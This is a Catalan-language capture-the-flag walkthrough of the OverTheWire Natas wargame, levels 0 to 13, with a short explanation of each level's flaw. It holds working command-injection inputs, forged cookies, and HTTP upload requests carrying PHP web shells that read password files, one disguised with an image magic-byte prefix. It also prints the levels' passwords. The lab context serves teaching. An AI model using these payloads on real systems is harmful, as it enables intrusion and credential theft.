
-**level 0**

Cliquem a la url que ens apareix i hi entrem amb les credencials que ens donen:

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/46820382-c276-423b-b664-54ce91bfc6e6)
  
Mirem el codi font i allà trobem la password per el level 1


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_dba7eb0139d35042.png)  

``g9D9cREhslqBKtcA2uocGHPfMZVzeFK6``

**Error:** tenir la contrasenya hardcoded a l’HTML a dins d’un comentari

-**level 1**

Aquí han bloquejat el click dret només al requadre blanc, a la resta de la pàgina no.

Per anar al level 2 ens passa el mateix, si mirem el codi font amb ctrl + u veiem la password de natas2:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_ac3a6a56d043112.png)  


``h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7``

**Error:** tenir la contrasenya hardcoded a l’HTML a dins d’un comentari i per molt que bloquejin el click dret sempre podrem accedir al codi font.


-**level 2:**

Podem veure que per veure el codi font de la pàgina també podem posar view-source davant de qualsevol url:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_bd673bbfca9bc9c7.png)  

  
Ara al codi font hi veiem la password de natas2, però podem veure si ens hi fixem que a la linia 10 hi ha un div que carrega una imatge de la carpeta files:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_c12cddc1fe3896a.png)  


I si anem al directori files:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_c3b6659ecc4751.png)  

  
Hi ha un fitxer.txt amb els usuaris i contrasenyes:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_2a1807041037e858.png)  

  
**Error:** Al servidor Apache tenen posada l’opció +indexes i degut a això podem veure aquest directori, la solució és anar al virtualhost d’aquesta pagina i al +indexes posar-hi en comptes d’un + un -.

Tampoc han amagat la versió del servidor de producció. Mai s’han de deixar els Apaches de serie.

-**Level 3**:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_d14aa84038edf000.png)  


No veiem res, anirem a mirar si existeix el fitxer robots.txt:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_4b268d7aed168fcd.png)  


Primer ens especifica qui (al haver-hi un asterisc vol dir que per tots els robots) els hi veta que puguin entrar a s3cr3t, gràcies a això a Google no hi està indexat aquest directori. Nosaltres hi entrarem:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_b56c99416fa90c11.png)  

I tornem a veure un fitxer users.txt que conté la password del següent nivell.

Podriem haver trobat el directori si no amb dirbuster o gobuster.


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_d723050bde359f51.png)  
  
``tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm``

**L’error** és l’indexes de l’Apache que mostra el contingut del directori. Han fet bé lo del robots però continua fallant l’indexes.

  
-**Level 4**

Ara utilizem el BurpSuite per fer aquest nivell.

  
![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_83a62829ad81ffca.png)  

Ara interceptem la petició ja que hem clicat a Refresh page:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_473b89e187af38ba.png)  

Com que se’ns demana provenir de la pàgina natas5, a Referer canviem el 4 per el 5 i fem forward:
  

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_642467809f5c3a6.png)  


I ara ja se’ns mostra la password per accedir a natas5:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_3fa05a7643a2617f.png)  

  
``Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD``


**Error:** es pot interceptar la petició i canviar manualment el número de la pàgina de la qual se’ns demana venir.
  
-**Level 5**

Interceptem la petició amb burpsuit, i veiem un missatge a la pàgina que ens diu que no estem loguejats:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_fde2355cac94c6c0.png)  

Al interceptar-lo veiem que la cookie que controla el login està a 0:

  

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_cc7d153eb8d628eb.png)  


Si la posem a 1, actua com un boleà i ens permet fer login:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_807bcc084b7bc4e8.png)  

Cliquem forward i se’ns mostra la contrasenya per accediral level 6:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_8bad8b2ab0030f50.png)  

``fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR``


**L’error** és que des de la pròpia cookie de la pàgina web podem modificar l’estat de login nostre i podem sense estar loguejats canviar-nos l’estat a loguejat, és a dir, podem enganyar l’estat del login.

-**Level 6**

Ara tenim la pantalla següent:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_a121c30f9298d3f7.png)  

Amb un camp d’input on s’ha de posar un secret, ens donen un enllaç per veure el codi font:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_284729e7edbcfcf2.png)  

Aquí veiem un codi PHP, a include veiem la ruta on podem trobar el secret, i si ens hi fixem si tenim el secret se’ns pintarà la password de natas 7.

Per tant anem al directori includes/secret.inc i fem ctrl +u i aconseguim el secret:

``FOEIUWGHFEEUHOFUOIU``

Ara posem el secret que hem trobat a l’input i així se’ns mostrarà la contrasenya de natas 7:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_6c24614424991ebb.png)  

  

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_8d5e042b6d556a8.png)  

  
``jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr``

**L’error** és que tenia aquest codi PHP amb la ruta on trobar el secret. Ho hem pogut fer al tenir el codi de la web, és a dir l’error es no haver securitzat el secret.inc i tenir-lo accessible per tothom.


-**Level 7**

Veiem una pàgina que té indexat una altra pàgina, una Home i una About:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_8c11d54377fe5332.png)  

Fem un ctrl + u i veiem que carrega les pàgines amb un argument, per tant aquí podrem injectar:

  

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_95be142f96f40b06.png)  

  

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_591d2d7480ee7b50.png)  

Com veiem ens donen una ruta, és un pass traversal per això mai s’ha de passar com a argument a la url el destí on hem d’anar:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_b9e134fb60650f66.png)  

I ja tenim la password:

``a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB``

**L’error** és accedir per un paràmetre a la URL. Es podria protegir el directori perquè no s’hi pugui accedir, es podrien descartar caràcters com per exemple fer que no es puguin posar barres amb un regex, sanejar l’entrada seria.

-**Level 8**


Veiem una pàgina amb un input com al Level 6:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_d500eb536618df5a.png)  

  
I un enllaç per veure el codi font i hi podem veure el codi PHP:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_1e537406eb6cde7e.png)  

  

Ara aquí tenim el secret encriptat. Veiem una funció que diu encode secret, en principi hem de poder fer un invers. **L’error** és: no tots els codis d’encriptació són desxifrables però aquest ho és.

Fem un programa per desencriptar-ho:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_305a58102154c6d8.png)  


I tenim el resultat: ``oubWYf2kBq``

Ara ja tenim el secret i el posem a l’input:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_dcc226f72dcd3942.png)  

I ja tenim la password:

``Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd``

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_72009511262a3c1c.png)  

-**Level 9:**

Si mirem el codi font no en treiem res am ctrl+u, per tant cliquem a View sourcecode:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_49476463f9896269.png)  

I ara sí que veiem el codi:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_a3fb1f144aa2fdbb.png)  

Ens haurem de barallar amb grep, -i vol dir que ens ho busqui ant amb majúscules com amb minúscules. Si poem a ens troba tot de paraules que contenen la paraula a:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_cedb04fcada9ceae.png)  

Tal i com està feta la pàgina està feta per no deixar-nos sortir del diccionari.

A nivell de bash script hem de separar i posar dues comandes amb ; que executarà grep -i després ; i després executarà la comanda que nosaltres vulguem. Posem ;ls /etc/natas_wepass:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_156d9999fe3704c7.png)  


El nostre usuari és natas9 i podem accedir al fitxer natas9 i al natas10, aquest últim degut al grup. Hem posat ;cat /etc/natas_webpass/natas10:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_a13ce12f1a61994a.png)  

  

``D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE``

**L’error** aquí és no sanejar l’entrada, és a dir no capar els caràcters com /, etc cosa que ens ha permés tallar una comanda i posar-ne una altra a continuació. Al no sanejar-lo ens permet fer una injecció de codi que es renderitza al cantó del servidor. La solució és sanejar caràcters com /.

**Level 10**

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_cc7198ef3c51e667.png)  

Al codi font veiem com han anulat el ; la / etc:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_96d737ffda94df36.png)  

Primer buscarem un valor vàlid i després li direm al fitxer que volem buscar (en comptes dal ditcionary.txt)

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_245b92cc423bb8a8.png)  


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_dab426f74693ece9.png)  

  
``1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg``

I ja tenim la password, hem tingut sort perquè a la contrasenya hi ha una a. Hem d’encertar un dels caràcters de la contrasenya o si no no ens surt, per exemple si ho provem amb la z no ens sortirà la contrasenya.

**L’error** és permetre el caràcter de barra ja que no està securitzat i podem posar rutes alternatives.

-**Level 11**


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_22ce976115e328a6.png)  


Si cliquem a View sourcecode:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_d80e49915f03f718.png)  


Si la cookie estigués només en base64 la podríem desencriptar amb el burpsuite mateix:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_7df3a86e0836bdcd.png)  

I ja tenim la cookie també:

``MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D``

Necessitem el json: `"showpassword"``=>``"no"``,` `"bgcolor"``=>``"#ffffff"`

La key que ha fet servir per codificar el json i que no coneixem.

I la pròpia cookie que sí que tenim.

Hem d’aconseguir fer json XOR cookie= key ja que és l'invers del que fa la codificació original que és: json XOR key =cookie i així podrem reproduir el procés i encriptar tal i com ho fa l’script. Amb un XOR podem amb 2 de les 3 informacions aconseguir la restant.

Ara per tant necessitarem un editor de PHP i tirar aquest codi perquè ens doni la key:


``<?php // Enter your code here, enjoy! $json_sting = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff")); $cookie_sting = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY="); echo ($json_sting ^ $cookie_sting); ?>``

  

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_4a89a16714752e1c.png)  

  

Ara tenim la key i veiem que és: ``KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK``

Ara hem de fer l’encriptació, i obtindrem una cookie que en comtpes de dir showpassord=no posarà showpassword=yes i obtindrem la cookie:

``<?php $data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"); function xor_encrypt($in) { $key = 'KNHL'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i<strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } echo base64_encode(xor_encrypt(json_encode($data))); ?>``


La cookie que ens dona el codi anterior: ``MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz``

Ara canviem la cookie des de Burpsuite per exemple i ja obtenim la contrasenya:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_e806269c81cffdae.png)  


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_c068bd579a7e0789.png)  


``YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG``

**L’error** és encriptar la key amb el mètode XOR que és un mètode reversible i per això podem obtenir la key.


Es podria solucionar fent servir una clau pública i privada per encriptar la cookie.

-**Level 12**

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_ec8986130d099d5b.png)  

```<html>   <head>   <!-- This stuff in the header has nothing to do with the level -->   <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">   <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />   <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />   <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>   <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>   <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>   <script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>   <body>   <h1>natas12</h1>   <div id="content">   ``<?php      ``function` `genRandomString``() {`    `$length` `=` `10``;`    `$characters` `=` `"0123456789abcdefghijklmnopqrstuvwxyz"``;`    `$string` `=` `""``;          for (``$p` `=` `0``;` `$p` `<` `$length``;` `$p``++) {`        `$string` `.=` `$characters``[``mt_rand``(``0``,` `strlen``(``$characters``)-``1``)];       }          return` `$string``;   }      function` `makeRandomPath``(``$dir``,` `$ext``) {       do {`    `$path` `=` `$dir``.``"/"``.``genRandomString``().``"."``.``$ext``;       } while(``file_exists``(``$path``));       return` `$path``;   }      function` `makeRandomPathFromFilename``(``$dir``,` `$fn``) {`    `$ext` `=` `pathinfo``(``$fn``,` `PATHINFO_EXTENSION``);       return` `makeRandomPath``(``$dir``,` `$ext``);   }      if(``array_key_exists``(``"filename"``,` `$_POST``)) {`    `$target_path` `=` `makeRandomPathFromFilename``(``"upload"``,` `$_POST``[``"filename"``]);                 if(``filesize``(``$_FILES``[``'uploadedfile'``][``'tmp_name'``]) >` `1000``) {           echo` `"File is too big"``;       } else {           if(``move_uploaded_file``(``$_FILES``[``'uploadedfile'``][``'tmp_name'``],` `$target_path``)) {               echo` `"The file <a href=\"``$target_path``\">``$target_path``</a> has been uploaded"``;           } else{               echo` `"There was an error uploading the file, please try again!"``;           }       }   } else {   ``?>   ``   <form enctype="multipart/form-data" action="index.php" method="POST">   <input type="hidden" name="MAX_FILE_SIZE" value="1000" />   <input type="hidden" name="filename" value="``<?php` `print` `genRandomString``();` `?>``.jpg" />   Choose a JPEG to upload (max 1KB):<br/>   <input name="uploadedfile" type="file" /><br />   <input type="submit" value="Upload File" />   </form>   ``<?php` `}` `?>   ``<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>   </div>   </body>   </html>```

  

Pujem la imatge i deixem passar la petició, estem amb BurpSuite:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_8109dc981ec59674.png)  

  
I ara la nostra image està a la url que se’ns facilita:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_5d94bf4d4a2c556e.png)  


I podem veure la «imatge»:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_857d24b41833bbf6.png)  

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_2fe32a7078e2b902.png)  

Ara el codi font és el següent:

```
`<html>  
<head>  
<!-- This stuff in the header has nothing to do with the level -->  
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />  
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>  
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>  
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>  
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>  
<body>  
<h1>natas12</h1>  
<div id="content">  
<?php  
  
function genRandomString() {  
    $length = 10;  
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";  
    $string = "";  
  
    for ($p = 0; $p < $length; $p++) {  
        $string .= $characters[mt_rand(0, strlen($characters)-1)];  
    }  
  
    return $string;  
}  
  
function makeRandomPath($dir, $ext) {  
    do {  
    $path = $dir."/".genRandomString().".".$ext;  
    } while(file_exists($path));  
    return $path;  
}  
  
function makeRandomPathFromFilename($dir, $fn) {  
    $ext = pathinfo($fn, PATHINFO_EXTENSION);  
    return makeRandomPath($dir, $ext);  
}  
  
if(array_key_exists("filename", $_POST)) {  
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);  
  
  
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  
        echo "File is too big";  
    } else {  
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {  
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";  
        } else{  
            echo "There was an error uploading the file, please try again!";  
        }  
    }  
} else {  
?>  
  
<form enctype="multipart/form-data" action="index.php" method="POST">  
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />  
Choose a JPEG to upload (max 1KB):<br/>  
<input name="uploadedfile" type="file" /><br />  
<input type="submit" value="Upload File" />  
</form>  
<?php } ?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>  
</div>  
</body>  
</html>`
```

  

Veiem que un cop té un nom random i una ruta random fa el path del fitxer pujat amb els valors aquests.

Aquí hem de valorar que ens deixa pujar un arxiu i després veure la ruta, per tant podem veure que el renderitza el servidor i el mostra. Per tant el que haurem de fer és injectar un codi al fitxer.


Provarem de fer un Hello World per exemple:

``<? echo ('hello world!') ?>``


I ara pujarem el fitxer a veure què passa:

```
`POST /index.php HTTP/1.1

Host: natas12.natas.labs.overthewire.org

Content-Length: 432

Cache-Control: max-age=0

Authorization: Basic bmF0YXMxMjpZV3FvMHBqcGNYelNJbDVOTUFWeGcxMlF4ZUMxdzlRRw==

Upgrade-Insecure-Requests: 1

Origin: http://natas12.natas.labs.overthewire.org

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc03BpyGwO15ssBN

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://natas12.natas.labs.overthewire.org/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: _ga=GA1.1.627158546.1708100915; _ga_RD0K2239G0=GS1.1.1708100914.1.1.1708100926.0.0.0

Connection: close

------WebKitFormBoundaryc03BpyGwO15ssBNP

Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000

------WebKitFormBoundaryc03BpyGwO15ssBNP

Content-Disposition: form-data; name="filename"
xq6qamzrfv.jpg

------WebKitFormBoundaryc03BpyGwO15ssBNP

Content-Disposition: form-data; name="uploadedfile"; filename="image.jpg"

Content-Type: image/jpeg
````



``<? echo ('hello world!') ?>``


``------WebKitFormBoundaryc03BpyGwO15ssBNP--``

  
Ens dona la URL, hi cliquem però seguim sense veure res:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_1f5d953c92df3a9b.png)  

Per tant al moment d’enviar la petició hem de canviar el format perquè ens interpreti le PHP:


```
`POST /index.php HTTP/1.1

Host: natas12.natas.labs.overthewire.org

Content-Length: 432

Cache-Control: max-age=0

Authorization: Basic bmF0YXMxMjpZV3FvMHBqcGNYelNJbDVOTUFWeGcxMlF4ZUMxdzlRRw==

Upgrade-Insecure-Requests: 1

Origin: http://natas12.natas.labs.overthewire.org

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzJD8UIUOdPNnAVWd

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://natas12.natas.labs.overthewire.org/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: _ga=GA1.1.627158546.1708100915; _ga_RD0K2239G0=GS1.1.1708100914.1.1.1708100926.0.0.0

Connection: close

------WebKitFormBoundaryzJD8UIUOdPNnAVWd

  

Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000

------WebKitFormBoundaryzJD8UIUOdPNnAVWd

Content-Disposition: form-data; name="filename"

xq6qamzrfv.jpg CANVIEM AQUEST .JPG PER .PHP.

------WebKitFormBoundaryzJD8UIUOdPNnAVWd

Content-Disposition: form-data; name="uploadedfile"; filename="image.jpg"

Content-Type: image/jpeg`
```



``<? echo ('hello world!') ?>``

  
``------WebKitFormBoundaryzJD8UIUOdPNnAVWd--``


I ara podem veure el hello world:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_4c2a193f5b11558d.png)  

hello world!


Al moment del enviament com que ja ha verificat que çés un jpg, ja no ho torna a verificar i si interceptem la petició podem modificar-ho.

Preparem que ens executi la comanda amb bash que serà la contrasenya mostrada amb echo de natas 13:

``<? echo (exec('cat /etc/natas_webpass/natas13')); ?>``


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_f52b5fe8692535dd.png)  

Tornem a modificar el nom random que ens genera, i l’error és que es genera del cantó del client i podem manipular el nom, si vols del cantó del servidor no tindriem res a fer:

  

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_392caa4a7dcf3b39.png)  

  

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_f6c32da126ac2c6f.png)  


```
`POST /index.php HTTP/1.1

Host: natas12.natas.labs.overthewire.org

Content-Length: 457

Cache-Control: max-age=0

Authorization: Basic bmF0YXMxMjpZV3FvMHBqcGNYelNJbDVOTUFWeGcxMlF4ZUMxdzlRRw==

Upgrade-Insecure-Requests: 1

Origin: http://natas12.natas.labs.overthewire.org

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrgvYZeoUMqd7Uzw5

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://natas12.natas.labs.overthewire.org/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: _ga=GA1.1.627158546.1708100915; _ga_RD0K2239G0=GS1.1.1708100914.1.1.1708100926.0.0.0

Connection: close

------WebKitFormBoundaryrgvYZeoUMqd7Uzw5

Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000

------WebKitFormBoundaryrgvYZeoUMqd7Uzw5

Content-Disposition: form-data; name="filename"

xq6qamzrfv.php

------WebKitFormBoundaryrgvYZeoUMqd7Uzw5

Content-Disposition: form-data; name="uploadedfile"; filename="image.jpg"

Content-Type: image/jpeg`
```

``<? echo (exec('cat /etc/natas_webpass/natas13')); ?>``

``------WebKitFormBoundaryrgvYZeoUMqd7Uzw5--``


**L’error** és que l’string random és genera al costat del client no al servidor. Ara ja tenim la contrasenya de natas13:

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_5444a0df36402091.png)  

La contrasenya de natas13:

``lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9``

**L’error** és generar al cantó del client l’string random en comptes de al servidor.

-**Level 13**

Ara sí que ens comprova la imatge, anem a comprovar el codi font:

<html>  
<head>  
<!-- This stuff in the header has nothing to do with the level -->  
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />  
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>  
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>  
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>  
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>  
<body>  
<h1>natas13</h1>  
<div id="content">  
For security reasons, we now only accept image files!<br/><br/>  
  
<?php  
  
function genRandomString() {  
    $length = 10;  
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";  
    $string = "";  
  
    for ($p = 0; $p < $length; $p++) {  
        $string .= $characters[mt_rand(0, strlen($characters)-1)];  
    }  
  
    return $string;  
}  
  
function makeRandomPath($dir, $ext) {  
    do {  
    $path = $dir."/".genRandomString().".".$ext;  
    } while(file_exists($path));  
    return $path;  
}  
  
function makeRandomPathFromFilename($dir, $fn) {  
    $ext = pathinfo($fn, PATHINFO_EXTENSION);  
    return makeRandomPath($dir, $ext);  
}  
  
if(array_key_exists("filename", $_POST)) {  
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);  
  
    $err=$_FILES['uploadedfile']['error'];  
    if($err){  
        if($err === 2){  
            echo "The uploaded file exceeds MAX_FILE_SIZE";  
        } else{  
            echo "Something went wrong :/";  
        }  
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  
        echo "File is too big";  
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
        echo "File is not an image";  
    } else {  
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {  
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";  
        } else{  
            echo "There was an error uploading the file, please try again!";  
        }  
    }  
} else {  
?>  
  
<form enctype="multipart/form-data" action="index.php" method="POST">  
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />  
Choose a JPEG to upload (max 1KB):<br/>  
<input name="uploadedfile" type="file" /><br />  
<input type="submit" value="Upload File" />  
</form>  
<?php } ?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>  
</div>  
</body>  
</html>


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_6fc68ca3587634a9.png)  


Ara hi ha una funció que comprova que pujem una imatge al codi de la pàgina.

Hem d’investigar el magic numbers, que verifiquen que el fitxer sigui una imatge, i haurem d’intentar enganyar fent que esl primers bits siguin alguns dels magin numbers per intentar enganyar el codi de la pàgina. [File Magic Numbers (github.com)](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5)


Hem de posar el codi ascii als primers bits del fitxer per intentar enganyar-lo:


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_993b1afcb68363e9.png)  

  

``BM;<? echo (exec('cat /etc/natas_webpass/natas14')); ?>``

El servidor comprovarà els primers bits i si li es pensa que és una imatge ens deixarà passar:

Canviem a PHP la petició interceptada amb burpsuite també, igual que abans:

6igbjfy1kx.php

Ens dona el link, hi cliquem i ja tenim la password, que ve amb el BM (ja que ho hem provat amb el format BMP) i li hem de treure:

